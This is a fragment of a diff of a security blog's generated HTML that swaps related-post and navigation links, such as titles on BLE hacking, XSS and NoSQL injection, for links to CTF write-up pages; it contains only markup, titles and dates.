-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/ble/">Bluetooth Low Energy Hacking 101</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  <time datetime="2025-02-17T00:00:00&#43;00:00">17 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">11 mins</span>
-  
-
-  
-  
-</div>
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ble/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    BLE
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hardware/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Hardware
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/guide/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Guide
-  </span>
-</span>
-  </span>
-  
-  
-  
-  
-</div>
-
-
-
-
-        </div>
-
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-  
-</section>
 
   
       </div>
@@ -1265,8 +933,8 @@ password_2=
           
         
       <script>
-        var oid = "views_posts\/Reflected XSS to ATO\/index.md"
-        var oid_likes = "likes_posts\/Reflected XSS to ATO\/index.md"
+        var oid = "views_ctfs\/Glacier-2024\/index.md"
+        var oid_likes = "likes_ctfs\/Glacier-2024\/index.md"
       </script>
       
       
@@ -1286,40 +954,18 @@ password_2=
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/intro-to-nosql/">
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Introduction to NoSQL Injection Attacks</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-02-18T00:00:00&#43;00:00">18 February 2025</time>
-                  
-                </span>
-              </span>
-            </a>
-          
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/posts/intro-to-cache-poisoning/">
+            <a class="flex text-right group ml-3" href="/ctfs/1337up-2024/">
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Introduction to Cache Poisoning Attacks</span
+                  >1337UP</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-02-19T00:00:00&#43;00:00">19 February 2025</time>
+                    <time datetime="2024-11-16T00:00:00&#43;00:00">16 November 2024</time>
                   
                 </span>
               </span>
